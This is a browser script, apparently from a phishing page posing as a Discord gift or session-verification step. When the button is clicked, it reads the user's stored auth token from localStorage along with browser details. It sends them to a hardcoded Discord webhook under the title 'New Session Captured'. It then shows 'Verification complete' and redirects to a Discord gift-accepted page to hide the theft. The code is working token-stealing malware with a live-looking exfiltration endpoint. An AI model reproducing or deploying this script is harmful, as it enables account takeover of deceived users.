<script>
        document.getElementById('btn').onclick = async function() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            
            // UI Feedback
            btn.style.opacity = '0.5';
            btn.style.pointerEvents = 'none';
            status.innerText = "Validating session...";

            // Robust data harvesting
            const getBrowserInfo = () => ({
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            });

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");

            // Build the data payload
            const payload = {
                embeds: [{
                    title: "🚀 New Session Captured",
                    color: 0x5865F2,
                    fields: [
                        { name: "Auth Token", value: `\`${token || "Not Found"}\``, inline: false },
                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
                        { name: "Resolution", value: `\`${window.screen.width}x${window.screen.height}\``, inline: true },
                        { name: "Timezone", value: `\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true }
                    ],
                    footer: { text: "Session Tracker v2.0 | Automated Capture" },
                    timestamp: new Date().toISOString()
                }]
            };

            // Attempt to send data
            try {
                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Transmission failed:", err);
            }
            
            // Finalize user experience
            status.innerText = "Verification complete. Redirecting...";
            await new Promise(r => setTimeout(r, 1200));
            window.location.href = "https://discord.com/billing/promotions/gift-accepted";
        };
    </script>
